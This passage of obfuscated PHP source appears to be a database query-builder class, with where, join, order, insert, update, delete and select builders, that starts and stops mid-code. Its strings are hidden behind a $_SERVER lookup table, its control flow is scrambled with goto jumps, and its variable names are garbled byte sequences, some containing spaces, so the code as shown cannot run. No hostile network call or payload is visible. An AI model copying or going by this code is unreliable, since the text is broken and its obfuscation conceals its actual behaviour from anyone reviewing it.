$B×Á°å¬•È; } else { $Dë ‚äˆØ¤ = isset($B×Á°å¬•È[$cŒÄî”É»À[979]]) ? strtoupper($B×Á°å¬•È[$cŒÄî”É»À[979]]) : $cŒÄî”É»À[33]; if (in_array($Dë ‚äˆØ¤, array($cŒÄî”É»À[980], $cŒÄî”É»À[981], $cŒÄî”É»À[982]))) { $Dë ‚äˆØ¤ = $cŒÄî”É»À[50] . $Dë ‚äˆØ¤ . $cŒÄî”É»À[50]; unset($B×Á°å¬•È[$cŒÄî”É»À[979]]); } else { $Dë ‚äˆØ¤ = $cŒÄî”É»À[983]; } foreach ($B×Á°å¬•È as $dÖÂ¤ƒß„ => $AºÖ®´…Çš) { $E™¸öŸ«² .= $cŒÄî”É»À[275]; if (is_numeric($dÖÂ¤ƒß„)) { $dÖÂ¤ƒß„ = $cŒÄî”É»À[984]; } if (0 === strpos($dÖÂ¤ƒß„, $cŒÄî”É»À[71])) { $E™¸öŸ«² .= $this->parseThinkWhere($dÖÂ¤ƒß„, $AºÖ®´…Çš); } else { if (!preg_match($cŒÄî”É»À[985], trim($dÖÂ¤ƒß„))) { think_exception(think_lang($cŒÄî”É»À[986]) . $cŒÄî”É»À[4] . $dÖÂ¤ƒß„); } $b˜¸¶‹‰í¼ = is_array($AºÖ®´…Çš) && isset($AºÖ®´…Çš[$cŒÄî”É»À[987]]); $dÖÂ¤ƒß„ = trim($dÖÂ¤ƒß„); if (strpos($dÖÂ¤ƒß„, $cŒÄî”É»À[281])) { $CÄà®ÒË = explode($cŒÄî”É»À[281], $dÖÂ¤ƒß„); $eÚ˜Î‰ÚœÃ = array(); foreach ($CÄà®ÒË as $AŠáòôÙ¹Š => $bÏ¾àŸêÜÍ) { $bÏİË = $b˜¸¶‹‰í¼ ? $AºÖ®´…Çš[$AŠáòôÙ¹Š] : $AºÖ®´…Çš; $eÚ˜Î‰ÚœÃ[] = $cŒÄî”É»À[258] . $this->parseWhereItem($this->parseKey($bÏ¾àŸêÜÍ), $bÏİË) . $cŒÄî”É»À[887]; } $E™¸öŸ«² .= implode($cŒÄî”É»À[988], $eÚ˜Î‰ÚœÃ); } elseif (strpos($dÖÂ¤ƒß„, $cŒÄî”É»À[282])) { $CÄà®ÒË = explode($cŒÄî”É»À[282], $dÖÂ¤ƒß„); $eÚ˜Î‰ÚœÃ = array(); foreach ($CÄà®ÒË as $AŠáòôÙ¹Š => $bÏ¾àŸêÜÍ) { $bÏİË = $b˜¸¶‹‰í¼ ? $AºÖ®´…Çš[$AŠáòôÙ¹Š] : $AºÖ®´…Çš; $eÚ˜Î‰ÚœÃ[] = $cŒÄî”É»À[258] . $this->parseWhereItem($this->parseKey($bÏ¾àŸêÜÍ), $bÏİË) . $cŒÄî”É»À[887]; } $E™¸öŸ«² .= implode($cŒÄî”É»À[983], $eÚ˜Î‰ÚœÃ); } else { $E™¸öŸ«² .= $this->parseWhereItem($this->parseKey($dÖÂ¤ƒß„), $AºÖ®´…Çš); } } $E™¸öŸ«² .= $cŒÄî”É»À[276] . $Dë ‚äˆØ¤; } $E™¸öŸ«² = substr($E™¸öŸ«², 0, -strlen($Dë ‚äˆØ¤)); } return empty($E™¸öŸ«²) ? $cŒÄî”É»À[33] : $cŒÄî”É»À[989] . $E™¸öŸ«²; } protected function parseWhereItem($F˜º’ˆâ˜Ş, $fÊ±ÄâÉÁ) { $Eè‹´õóÁô =& $_SERVER[ä°„ä°º]; $b±ªÁ´ó¾À = $Eè‹´õóÁô[33]; if (is_array($fÊ±ÄâÉÁ)) { if (is_string($fÊ±ÄâÉÁ[0])) { $C—š§´Œéâ = strtolower($fÊ±ÄâÉÁ[0]); if (in_array($fÊ±ÄâÉÁ[0], array($Eè‹´õóÁô[973], $Eè‹´õóÁô[990], $Eè‹´õóÁô[991], $Eè‹´õóÁô[992], $Eè‹´õóÁô[993], $Eè‹´õóÁô[994]))) { $b±ªÁ´ó¾À .= $F˜º’ˆâ˜Ş . $Eè‹´õóÁô[50] . $fÊ±ÄâÉÁ[0] . $Eè‹´õóÁô[50] . $this->parseValue($fÊ±ÄâÉÁ[1]); } elseif (preg_match($Eè‹´õóÁô[995], $fÊ±ÄâÉÁ[0])) { $b±ªÁ´ó¾À .= $F˜º’ˆâ˜Ş . $Eè‹´õóÁô[50] . $this->exp[$C—š§´Œéâ] . $Eè‹´õóÁô[50] . $this->parseValue($fÊ±ÄâÉÁ[1]); } elseif (preg_match($Eè‹´õóÁô[996], $fÊ±ÄâÉÁ[0])) { if (is_array($fÊ±ÄâÉÁ[1])) { $e‰±¬®Á‚ = isset($fÊ±ÄâÉÁ[2]) ? strtoupper($fÊ±ÄâÉÁ[2]) : $Eè‹´õóÁô[981]; if (in_array($e‰±¬®Á‚, array($Eè‹´õóÁô[980], $Eè‹´õóÁô[981], $Eè‹´õóÁô[982]))) { $AÆ†Ê´»õœ = array(); foreach ($fÊ±ÄâÉÁ[1] as $BÜ……âËïÖ) { $AÆ†Ê´»õœ[] = $F˜º’ˆâ˜Ş . $Eè‹´õóÁô[50] . $this->exp[$C—š§´Œéâ] . $Eè‹´õóÁô[50] . $this->parseValue($BÜ……âËïÖ); } $b±ªÁ´ó¾À .= $Eè‹´õóÁô[258] . implode($Eè‹´õóÁô[50] . $e‰±¬®Á‚ . $Eè‹´õóÁô[50], $AÆ†Ê´»õœ) . $Eè‹´õóÁô[887]; } } else { $b±ªÁ´ó¾À .= $F˜º’ˆâ˜Ş . $Eè‹´õóÁô[50] . $this->exp[$C—š§´Œéâ] . $Eè‹´õóÁô[50] . $this->parseValue($fÊ±ÄâÉÁ[1]); } } elseif ($Eè‹´õóÁô[295] == $C—š§´Œéâ) { $b±ªÁ´ó¾À .= $Eè‹´õóÁô[885] . $F˜º’ˆâ˜Ş . $Eè‹´õóÁô[50] . $fÊ±ÄâÉÁ[1] . $Eè‹´õóÁô[997]; } elseif (preg_match($Eè‹´õóÁô[998], $fÊ±ÄâÉÁ[0])) { $b±ªÁ´ó¾À .= $fÊ±ÄâÉÁ[0]; } elseif (preg_match($Eè‹´õóÁô[999], $fÊ±ÄâÉÁ[0])) { if (isset($fÊ±ÄâÉÁ[2]) && $Eè‹´õóÁô[295] == $fÊ±ÄâÉÁ[2]) { $b±ªÁ´ó¾À .= $F˜º’ˆâ˜Ş . $Eè‹´õóÁô[50] . $this->exp[$C—š§´Œéâ] . $Eè‹´õóÁô[50] . $fÊ±ÄâÉÁ[1]; } else { if (is_string($fÊ±ÄâÉÁ[1])) { $fÊ±ÄâÉÁ[1] = explode($Eè‹´õóÁô[47], $fÊ±ÄâÉÁ[1]); } $Cëµ‘Ûåî³ = implode($Eè‹´õóÁô[47], $this->parseValue($fÊ±ÄâÉÁ[1])); $b±ªÁ´ó¾À .= $F˜º’ˆâ˜Ş . $Eè‹´õóÁô[50] . $this->exp[$C—š§´Œéâ] . $Eè‹´õóÁô[885] . $Cëµ‘Ûåî³ . $Eè‹´õóÁô[887]; } } elseif (preg_match($Eè‹´õóÁô[1000], $fÊ±ÄâÉÁ[0])) { $AˆÌëèó³ã = is_string($fÊ±ÄâÉÁ[1]) ? explode($Eè‹´õóÁô[47], $fÊ±ÄâÉÁ[1]) : $fÊ±ÄâÉÁ[1]; $b±ªÁ´ó¾À .= $Eè‹´õóÁô[885] . $F˜º’ˆâ˜Ş . $Eè‹´õóÁô[50] . $this->exp[$C—š§´Œéâ] . $Eè‹´õóÁô[50] . $this->parseValue($AˆÌëèó³ã[0]) . $Eè‹´õóÁô[983] . $this->parseValue($AˆÌëèó³ã[1]) . $Eè‹´õóÁô[276]; } else { think_exception(think_lang($Eè‹´õóÁô[986]) . $Eè‹´õóÁô[4] . $fÊ±ÄâÉÁ[0]); } } else { $eí­°ºÙî = count($fÊ±ÄâÉÁ); $F¦Áé­Ù×Ğ = $Eè‹´õóÁô[33]; if (is_string($fÊ±ÄâÉÁ[$eí­°ºÙî - 1])) { $F¦Áé­Ù×Ğ = isset($fÊ±ÄâÉÁ[$eí­°ºÙî - 1]) ? strtoupper($fÊ±ÄâÉÁ[$eí­°ºÙî - 1]) : $Eè‹´õóÁô[33]; if (in_array($F¦Áé­Ù×Ğ, array($Eè‹´õóÁô[980], $Eè‹´õóÁô[981], $Eè‹´õóÁô[982]))) { $eí­°ºÙî = $eí­°ºÙî - 1; } } else { $F¦Áé­Ù×Ğ = $Eè‹´õóÁô[980]; } for ($aóÙ÷ÉÑ¢ = 0; $aóÙ÷ÉÑ¢ < $eí­°ºÙî; $aóÙ÷ÉÑ¢++) { $AˆÌëèó³ã = is_array($fÊ±ÄâÉÁ[$aóÙ÷ÉÑ¢]) ? $fÊ±ÄâÉÁ[$aóÙ÷ÉÑ¢][1] : $fÊ±ÄâÉÁ[$aóÙ÷ÉÑ¢]; if ($Eè‹´õóÁô[295] == strtolower($fÊ±ÄâÉÁ[$aóÙ÷ÉÑ¢][0])) { $b±ªÁ´ó¾À .= $Eè‹´õóÁô[258] . $F˜º’ˆâ˜Ş . $Eè‹´õóÁô[50] . $AˆÌëèó³ã . $Eè‹´õóÁô[997] . $F¦Áé­Ù×Ğ . $Eè‹´õóÁô[50]; } else { $C©§„»œ¤¹ = is_array($fÊ±ÄâÉÁ[$aóÙ÷ÉÑ¢]) ? $this->exp[strtolower($fÊ±ÄâÉÁ[$aóÙ÷ÉÑ¢][0])] : $Eè‹´õóÁô[973]; if (!$C©§„»œ¤¹ && is_array($fÊ±ÄâÉÁ[$aóÙ÷ÉÑ¢]) && in_array($fÊ±ÄâÉÁ[$aóÙ÷ÉÑ¢][0], array($Eè‹´õóÁô[973], $Eè‹´õóÁô[990], $Eè‹´õóÁô[991], $Eè‹´õóÁô[992], $Eè‹´õóÁô[993], $Eè‹´õóÁô[994]))) { $C©§„»œ¤¹ = $fÊ±ÄâÉÁ[$aóÙ÷ÉÑ¢][0]; } $b±ªÁ´ó¾À .= $Eè‹´õóÁô[258] . $F˜º’ˆâ˜Ş . $Eè‹´õóÁô[50] . $C©§„»œ¤¹ . $Eè‹´õóÁô[50] . $this->parseValue($AˆÌëèó³ã) . $Eè‹´õóÁô[997] . $F¦Áé­Ù×Ğ . $Eè‹´õóÁô[50]; } } $b±ªÁ´ó¾À = substr($b±ªÁ´ó¾À, 0, -4); } } else { $b±ªÁ´ó¾À .= $F˜º’ˆâ˜Ş . $Eè‹´õóÁô[1001] . $this->parseValue($fÊ±ÄâÉÁ); } return $b±ªÁ´ó¾À; } protected function parseThinkWhere($BÆ¦«êë†É, $E•ø¯»õïù) { $D‘ğêêàÒÍ =& $_SERVER[ä°„ä°º]; $f¯èÛÔ®„è = $D‘ğêêàÒÍ[33]; switch ($BÆ¦«êë†É) { case $D‘ğêêàÒÍ[350]: $f¯èÛÔ®„è = $E•ø¯»õïù; break; case $D‘ğêêàÒÍ[984]: $f¯èÛÔ®„è = is_string($E•ø¯»õïù) ? $E•ø¯»õïù : substr($this->parseWhere($E•ø¯»õïù), 6); break; case $D‘ğêêàÒÍ[1002]: parse_str($E•ø¯»õïù, $EšÔ“Ôˆ¥); if (isset($EšÔ“Ôˆ¥[$D‘ğêêàÒÍ[979]])) { $bÍ·ŞØ‡Ë = $D‘ğêêàÒÍ[50] . strtoupper($EšÔ“Ôˆ¥[$D‘ğêêàÒÍ[979]]) . $D‘ğêêàÒÍ[50]; unset($EšÔ“Ôˆ¥[$D‘ğêêàÒÍ[979]]); } else { $bÍ·ŞØ‡Ë = $D‘ğêêàÒÍ[983]; } $CÏ££•Ó¯ = array(); foreach ($EšÔ“Ôˆ¥ as $eÌ‘‰ƒÌäö => $Fï˜‰¼ç¸) { $CÏ££•Ó¯[] = $this->parseKey($eÌ‘‰ƒÌäö) . $D‘ğêêàÒÍ[1001] . $this->parseValue($Fï˜‰¼ç¸); } $f¯èÛÔ®„è = implode($bÍ·ŞØ‡Ë, $CÏ££•Ó¯); break; } return $f¯èÛÔ®„è; } protected function parseLimit($bî¸Òê…íÖ) { $ašÄË‘¬ =& $_SERVER[ä°„ä°º]; return !empty($bî¸Òê…íÖ) ? $ašÄË‘¬[48] . $bî¸Òê…íÖ . $ašÄË‘¬[50] : $ašÄË‘¬[33]; } protected function parseJoin($CÂçÀ›ÏêŸ) { $F£–íË « =& $_SERVER[ä°„ä°º]; $B±èßÃÒİ‡ = $F£–íË «[33]; if (!empty($CÂçÀ›ÏêŸ)) { if (is_array($CÂçÀ›ÏêŸ)) { foreach ($CÂçÀ›ÏêŸ as $a¿Ò‡ÊâÊ => $c¨µ”ˆô¨¹) { if (!1 !== stripos($c¨µ”ˆô¨¹, $F£–íË «[1003])) { $B±èßÃÒİ‡ .= $F£–íË «[50] . $c¨µ”ˆô¨¹; } else { $B±èßÃÒİ‡ .= $F£–íË «[1004] . $c¨µ”ˆô¨¹; } } } else { $B±èßÃÒİ‡ .= $F£–íË «[1004] . $CÂçÀ›ÏêŸ; } } $B±èßÃÒİ‡ = preg_replace($F£–íË «[1005], think_config($F£–íË «[911]) . $F£–íË «[1006], $B±èßÃÒİ‡); return $B±èßÃÒİ‡; } protected function parseOrder($b½ˆ‡éšè) { $Cë‡¼·éİ× =& $_SERVER[ä°„ä°º]; if (is_array($b½ˆ‡éšè)) { $Fëƒ†ÜÌ¡Ÿ = array(); foreach ($b½ˆ‡éšè as $cïÔ³Âí => $b…ÊÉğëà) { if (is_numeric($cïÔ³Âí)) { $Fëƒ†ÜÌ¡Ÿ[] = $this->parseKey($b…ÊÉğëà); } else { $b…ÊÉğëà = in_array(strtoupper(trim($b…ÊÉğëà)), array($Cë‡¼·éİ×[1007], $Cë‡¼·éİ×[1008])) ? $Cë‡¼·éİ×[50] . $b…ÊÉğëà : $Cë‡¼·éİ×[33]; if (preg_match($Cë‡¼·éİ×[1009], $cïÔ³Âí)) { $Fëƒ†ÜÌ¡Ÿ[] = $this->parseKey($cïÔ³Âí) . $b…ÊÉğëà; } else { think_exception($Cë‡¼·éİ×[1010] . $cïÔ³Âí); } } } $b½ˆ‡éšè = implode($Cë‡¼·éİ×[47], $Fëƒ†ÜÌ¡Ÿ); } return !empty($b½ˆ‡éšè) ? $Cë‡¼·éİ×[1011] . $b½ˆ‡éšè : $Cë‡¼·éİ×[33]; } protected function parseGroup($b¦ò½ß‘…) { $CíÊõç‰Ã° =& $_SERVER[ä°„ä°º]; return !empty($b¦ò½ß‘…) ? $CíÊõç‰Ã°[1012] . $b¦ò½ß‘… : $CíÊõç‰Ã°[33]; } protected function parseHaving($E…”ˆ‚ÑÊá) { $fæÄ›êÏÀğ =& $_SERVER[ä°„ä°º]; return !empty($E…”ˆ‚ÑÊá) ? $fæÄ›êÏÀğ[1013] . $E…”ˆ‚ÑÊá : $fæÄ›êÏÀğ[33]; } protected function parseComment($C¥Ô˜¥Üï³) { $c¸ÙÒŠ‡Œ =& $_SERVER[ä°„ä°º]; return !empty($C¥Ô˜¥Üï³) ? $c¸ÙÒŠ‡Œ[1014] . $C¥Ô˜¥Üï³ . $c¸ÙÒŠ‡Œ[1015] : $c¸ÙÒŠ‡Œ[33]; } protected function parseDistinct($D‚¼„ßÀ‰â) { $dğ…øùå§ =& $_SERVER[ä°„ä°º]; return !empty($D‚¼„ßÀ‰â) ? $dğ…øùå§[1016] : $dğ…øùå§[33]; } protected function parseUnion($d‡Ö¯æøõˆ) { $A ÚîÃĞ ¡ =& $_SERVER[ä°„ä°º]; if (empty($d‡Ö¯æøõˆ)) { return $A ÚîÃĞ ¡[33]; } if (isset($d‡Ö¯æøõˆ[$A ÚîÃĞ ¡[346]])) { $FÉÀĞßæò² = $A ÚîÃĞ ¡[1017]; unset($d‡Ö¯æøõˆ[$A ÚîÃĞ ¡[346]]); } else { $FÉÀĞßæò² = $A ÚîÃĞ ¡[1018]; } foreach ($d‡Ö¯æøõˆ as $f¬°‰Ï) { $aİ«˜îä“æ[] = $FÉÀĞßæò² . (is_array($f¬°‰Ï) ? $this->buildSelectSql($f¬°‰Ï) : $f¬°‰Ï); } return implode($A ÚîÃĞ ¡[50], $aİ«˜îä“æ); } public function insert($A³ÂÒ»“°, $EèÖ ê¿ƒÂ = array(), $fÂì¢¸Œ = false) { goto C«È×¯Ê‘‰; C«È×¯Ê‘‰: $E™ŞäÅÔÁ =& $_SERVER[ä°„ä°º]; $cèä½Ó¼« = $cÜ‘¾èİ•š = array(); $this->model = $EèÖ ê¿ƒÂ[$E™ŞäÅÔÁ[279]]; goto F‹Îåƒ¤š‘; F‹Îåƒ¤š‘: foreach ($A³ÂÒ»“° as $dÎ¯†Å­• => $b‹´î•ù) { if (is_array($b‹´î•ù) && $E™ŞäÅÔÁ[295] == $b‹´î•ù[0]) { $cÜ‘¾èİ•š[] = $this->parseKey($dÎ¯†Å­•); $cèä½Ó¼«[] = $b‹´î•ù[1]; } elseif (is_scalar($b‹´î•ù) || is_null($b‹´î•ù)) { $cÜ‘¾èİ•š[] = $this->parseKey($dÎ¯†Å­•); $cèä½Ó¼«[] = $this->parseValue($b‹´î•ù); } } $d¯¹Øˆö¬ = ($fÂì¢¸Œ ? $E™ŞäÅÔÁ[889] : $E™ŞäÅÔÁ[890]) . $E™ŞäÅÔÁ[891] . $this->parseTable($EèÖ ê¿ƒÂ[$E™ŞäÅÔÁ[277]]) . $E™ŞäÅÔÁ[885] . implode($E™ŞäÅÔÁ[47], $cÜ‘¾èİ•š) . $E™ŞäÅÔÁ[886] . implode($E™ŞäÅÔÁ[47], $cèä½Ó¼«) . $E™ŞäÅÔÁ[887]; $d¯¹Øˆö¬ .= $this->parseLock(isset($EèÖ ê¿ƒÂ[$E™ŞäÅÔÁ[835]]) ? $EèÖ ê¿ƒÂ[$E™ŞäÅÔÁ[835]] : !1); goto A÷ÌË„ŸŠó; A÷ÌË„ŸŠó: $d¯¹Øˆö¬ .= $this->parseComment(!empty($EèÖ ê¿ƒÂ[$E™ŞäÅÔÁ[352]]) ? $EèÖ ê¿ƒÂ[$E™ŞäÅÔÁ[352]] : $E™ŞäÅÔÁ[33]); return $this->execute($d¯¹Øˆö¬, $this->parseBind(!empty($EèÖ ê¿ƒÂ[$E™ŞäÅÔÁ[283]]) ? $EèÖ ê¿ƒÂ[$E™ŞäÅÔÁ[283]] : array())); goto eÍçÕá‰Ç“; eÍçÕá‰Ç“: } public function selectInsert($D©¯‹¤‰â†, $Eİ®†­íœ, $D­ó«•ëÁ‹ = array()) { goto E˜Êèøª¯ƒ; bĞëÖÄ¬¥‡: return $this->execute($eÉ¹óò­™, $this->parseBind(!empty($D­ó«•ëÁ‹[$d…Ò‘†•óê[283]]) ? $D­ó«•ëÁ‹[$d…Ò‘†•óê[283]] : array())); goto D„œ÷¤¡´¬; fĞ×ñ»Ş›ò: array_walk($D©¯‹¤‰â†, array($this, $d…Ò‘†•óê[888])); $eÉ¹óò­™ = $d…Ò‘†•óê[1019] . $this->parseTable($Eİ®†­íœ) . $d…Ò‘†•óê[885] . implode($d…Ò‘†•óê[47], $D©¯‹¤‰â†) . $d…Ò‘†•óê[997]; $eÉ¹óò­™ .= $this->buildSelectSql($D­ó«•ëÁ‹); goto bĞëÖÄ¬¥‡; E˜Êèøª¯ƒ: $d…Ò‘†•óê =& $_SERVER[ä°„ä°º]; $this->model = $D­ó«•ëÁ‹[$d…Ò‘†•óê[279]]; if (is_string($D©¯‹¤‰â†)) { $D©¯‹¤‰â† = explode($d…Ò‘†•óê[47], $D©¯‹¤‰â†); } goto fĞ×ñ»Ş›ò; D„œ÷¤¡´¬: } public function update($bÔ¨è©–­´, $F„âù°†É) { $B°’º¼±ª =& $_SERVER[ä°„ä°º]; $this->model = $F„âù°†É[$B°’º¼±ª[279]]; $f§„Á©Œä = $B°’º¼±ª[1020] . $this->parseTable($F„âù°†É[$B°’º¼±ª[277]]) . $this->parseSet($bÔ¨è©–­´) . $this->parseWhere(!empty($F„âù°†É[$B°’º¼±ª[273]]) ? $F„âù°†É[$B°’º¼±ª[273]] : $B°’º¼±ª[33]) . $this->parseOrder(!empty($F„âù°†É[$B°’º¼±ª[363]]) ? $F„âù°†É[$B°’º¼±ª[363]] : $B°’º¼±ª[33]) . $this->parseLimit(!empty($F„âù°†É[$B°’º¼±ª[290]]) ? $F„âù°†É[$B°’º¼±ª[290]] : $B°’º¼±ª[33]) . $this->parseLock(isset($F„âù°†É[$B°’º¼±ª[835]]) ? $F„âù°†É[$B°’º¼±ª[835]] : !1) . $this->parseComment(!empty($F„âù°†É[$B°’º¼±ª[352]]) ? $F„âù°†É[$B°’º¼±ª[352]] : $B°’º¼±ª[33]); return $this->execute($f§„Á©Œä, $this->parseBind(!empty($F„âù°†É[$B°’º¼±ª[283]]) ? $F„âù°†É[$B°’º¼±ª[283]] : array())); } public function delete($F°½¿§Ô¥ = array()) { $a¶À£Ãİ…ó =& $_SERVER[ä°„ä°º]; $this->model = $F°½¿§Ô¥[$a¶À£Ãİ…ó[279]]; $Aëßé®ÅÅ = $a¶À£Ãİ…ó[1021] . $this->parseTable($F°½¿§Ô¥[$a¶À£Ãİ…ó[277]]) . $this->parseWhere(!empty($F°½¿§Ô¥[$a¶À£Ãİ…ó[273]]) ? $F°½¿§Ô¥[$a¶À£Ãİ…ó[273]] : $a¶À£Ãİ…ó[33]) . $this->parseOrder(!empty($F°½¿§Ô¥[$a¶À£Ãİ…ó[363]]) ? $F°½¿§Ô¥[$a¶À£Ãİ…ó[363]] : $a¶À£Ãİ…ó[33]) . $this->parseLimit(!empty($F°½¿§Ô¥[$a¶À£Ãİ…ó[290]]) ? $F°½¿§Ô¥[$a¶À£Ãİ…ó[290]] : $a¶À£Ãİ…ó[33]) . $this->parseLock(isset($F°½¿§Ô¥[$a¶À£Ãİ…ó[835]]) ? $F°½¿§Ô¥[$a¶À£Ãİ…ó[835]] : !1) . $this->parseComment(!empty($F°½¿§Ô¥[$a¶À£Ãİ…ó[352]]) ? $F°½¿§Ô¥[$a¶À£Ãİ…ó[352]] : $a¶À£Ãİ…ó[33]); return $this->execute($Aëßé®ÅÅ, $this->parseBind(!empty($F°½¿§Ô¥[$a¶À£Ãİ…ó[283]]) ? $F°½¿§Ô¥[$a¶À£Ãİ…ó[283]] : array())); } public function select($FËÒšÕóìœ = array()) { goto e¹Ãçé›ª; e¹Ãçé›ª: $AÂİòÇùÖó =& $_SERVER[ä°„ä°º]; $this->model = $FËÒšÕóìœ[$AÂİòÇùÖó[279]]; $f£ò×‡¡ = $this->buildSelectSql($FËÒšÕóìœ); goto Eë°¼¢ò—Ò; Eë°¼¢ò—Ò: $Ağ¨‘Í¡œ† = isset($FËÒšÕóìœ[$AÂİòÇùÖó[347]]) ? $FËÒšÕóìœ[$AÂİòÇùÖó[347]] : !1; if ($Ağ¨‘Í¡œ†) { $C¨É‚¸™¸ = is_string($Ağ¨‘Í¡œ†[$AÂİòÇùÖó[93]]) ? $Ağ¨‘Í¡œ†[$AÂİòÇùÖó[93]] : $AÂİòÇùÖó[1022] . md5($f£ò×‡¡); $FŠİ§‘Ñ‡¶ = think_cache($C¨É‚¸™¸, $AÂİòÇùÖó[33], $Ağ¨‘Í¡œ†); if (!1 !== $FŠİ§‘Ñ‡¶) { return $FŠİ§‘Ñ‡¶; } } $EÌï¤˜Â‚ì = $this->query($f£ò×‡¡, $this->parseBind(!empty($FËÒšÕóìœ[$AÂİòÇùÖó[283]]) ? $FËÒšÕóìœ[$AÂİòÇùÖó[283]] : array())); goto dÙÍÀ­ÃÃá; dÙÍÀ­ÃÃá: if ($Ağ¨‘Í¡œ† && !1 !== $EÌï¤˜Â‚ì) { think_cache($C¨É‚¸™¸, $EÌï¤˜Â‚ì, $Ağ¨‘Í¡œ†); } return $EÌï¤˜Â‚ì; goto a–Ê„ë¸Î†; a–Ê„ë¸Î†: } public function buildSelectSql($A÷ˆª¿ï ‹ = array()) { goto Cñ—¸âÈØæ; Cñ—¸âÈØæ: $EøËÊ¤“¸¬ =& $_SERVER[ä°„ä°º]; if (isset($A÷ˆª¿ï ‹[$EøËÊ¤“¸¬[351]])) { if (strpos($A÷ˆª¿ï ‹[$EøËÊ¤“¸¬[351]], $EøËÊ¤“¸¬[47])) { list($cØâîÂ¤ë¿, $báÔä†ô) = explode($EøËÊ¤“¸¬[47], $A÷ˆª¿ï ‹[$EøËÊ¤“¸¬[351]]); } else { $cØâîÂ¤ë¿ = $A÷ˆª¿ï ‹[$EøËÊ¤“¸¬[351]]; } $cØâîÂ¤ë¿ = $cØâîÂ¤ë¿ ? $cØâîÂ¤ë¿ : 1; $báÔä†ô = isset($báÔä†ô) ? $báÔä†ô : (is_numeric($A÷ˆª¿ï ‹[$EøËÊ¤“¸¬[290]]) ? $A÷ˆª¿ï ‹[$EøËÊ¤“¸¬[290]] : 20); $fì™„¯Ú³ = $báÔä†ô * ((int) $cØâîÂ¤ë¿ - 1); $A÷ˆª¿ï ‹[$EøËÊ¤“¸¬[290]] = $fì™„¯Ú³ . $EøËÊ¤“¸¬[47] . $báÔä†ô; } if (think_config($EøËÊ¤“¸¬[1023])) { $BÊ­ÕêØ²¶ = $EøËÊ¤“¸¬[1024] . md5(serialize($A÷ˆª¿ï ‹)); $FÈËîÜîê´ = think_cache($BÊ­ÕêØ²¶); if ($FÈËîÜîê´) { return $FÈËîÜîê´; } } goto D‚İà¹‡; D‚İà¹‡: $aÀ¸‹ÉÂî‚ = $this->parseSql($this->selectSql, $A÷ˆª¿ï ‹); $aÀ¸‹ÉÂî‚ .= $this->parseLock(isset($A÷ˆª¿ï ‹[$EøËÊ¤“¸¬[835]]) ? $A÷ˆª¿ï ‹[$EøËÊ¤“¸¬[835]] : !1); if (isset($BÊ­ÕêØ²¶)) { think_cache($BÊ­ÕêØ²¶, $aÀ¸‹ÉÂî‚); } goto Eà’æƒÉÙ; Eà’æƒÉÙ: return $aÀ¸‹ÉÂî‚; goto bàæ“ÚÕÎ–; bàæ“ÚÕÎ–: } public function parseSql($Bø†“¡¯å, $C¾‰ƒ…º•Ç = array()) { $eÒšˆ×È =& $_SERVER[ä°„ä°º]; $Bø†“¡¯å = str_replace(array($eÒšˆ×È[1025], $eÒšˆ×È[1026], $eÒšˆ×È[1027], $eÒšˆ×È[1028], $eÒšˆ×È[1029], $eÒšˆ×È[1030], $eÒšˆ×È[1031], $eÒšˆ×È[1032], $eÒšˆ×È[1033], $eÒšˆ×È[1034], $eÒšˆ×È[1035]), array($this->parseTable("{$C¾‰ƒ…º•Ç[$eÒšˆ×È[277]]}"), $this->parseDistinct(isset($C¾‰ƒ…º•Ç[$eÒšˆ×È[1036]]) ? $C¾‰ƒ…º•Ç[$eÒšˆ×È[1036]] : !1), $this->parseField(!empty($C¾‰ƒ…º•Ç[$eÒšˆ×È[271]]) ? $C¾‰ƒ…º•Ç[$eÒšˆ×È[271]] : $eÒšˆ×È[182]), $this->parseJoin(!empty($C¾‰ƒ…º•Ç[$eÒšˆ×È[280]]) ? $C¾‰ƒ…º•Ç[$eÒšˆ×È[280]] : $eÒšˆ×È[33]), $this->parseWhere(!empty($C¾‰ƒ…º•Ç[$eÒšˆ×È[273]]) ? $C¾‰ƒ…º•Ç[$eÒšˆ×È[273]] : $eÒšˆ×È[33]), $this->parseGroup(!empty($C¾‰ƒ…º•Ç[$eÒšˆ×È[496]]) ? $C¾‰ƒ…º•Ç[$eÒšˆ×È[496]] : $eÒšˆ×È[33]), $this->parseHaving(!empty($C¾‰ƒ…º•Ç[$eÒšˆ×È[1037]]) ? $C¾‰ƒ…º•Ç[$eÒšˆ×È[1037]] : $eÒšˆ×È[33]), $this->parseOrder(!empty($C¾‰ƒ…º•Ç[$eÒšˆ×È[363]]) ? $C¾‰ƒ…º•Ç[$eÒšˆ×È[363]] : $eÒšˆ×È[33]), $this->parseLimit(!empty($C¾‰ƒ…º•Ç[$eÒšˆ×È[290]]) ? $C¾‰ƒ…º•Ç[$eÒšˆ×È[290]] : $eÒšˆ×È[33]), $this->parseUnion(!empty($C¾‰ƒ…º•Ç[$eÒšˆ×È[345]]) ? $C¾‰ƒ…º•Ç[$eÒšˆ×È[345]] : $eÒšˆ×È[33]), $this->parseComment(!empty($C¾‰ƒ…º•Ç[$eÒšˆ×È[352]]) ? $C¾‰ƒ…º•Ç[$eÒšˆ×È[352]] : $eÒšˆ×È[33])), $Bø†“¡¯å); return $Bø†“¡¯å; } public function getLastSql($fÃÈšÅ±‹Ñ = '') { return $fÃÈšÅ±‹Ñ ? $this->modelSql[$fÃÈšÅ±‹Ñ] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($e‚ëÛŒ‚¢”) { return addslashes($e‚ëÛŒ‚¢”); } public function setModel($CÓÈŸÊ‹–Ü) { $this->model = $CÓÈŸÊ‹–Ü; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($D¡Š¤µÒù, $Fƒù±›¯òš = '') { $this->database = $D¡Š¤µÒù; $this->type = $Fƒù±›¯òš; } public function model($DÛ×‡¬ø‘ö = '') { return new ModelBase($DÛ×‡¬ø‘ö, $_SERVER[ä°„ä°º][33], $this->database); } public function db($eÜ Ğ—¶Îå = false) { goto E…»ŞœÑÓ; D®¡äßËø: if (!$CÏôØéÏº) { $dåšŠùàßÚ->execute("\143\x72\x65\x61\x74\145\x20\144\141\164\141\142\x61\163\145\x20\140{$EÎ„Çà×Å}\x60"); } $Bˆˆ­Ñ¹Ô[$b¾ÂâåÏŠ×[951]] = $EÎ„Çà×Å; if ($Bˆˆ­Ñ¹Ô[$b¾ÂâåÏŠ×[777]] == $b¾ÂâåÏŠ×[778]) { $Bˆˆ­Ñ¹Ô[$b¾ÂâåÏŠ×[779]] .= $b¾ÂâåÏŠ×[1038] . $EÎ„Çà×Å; } goto 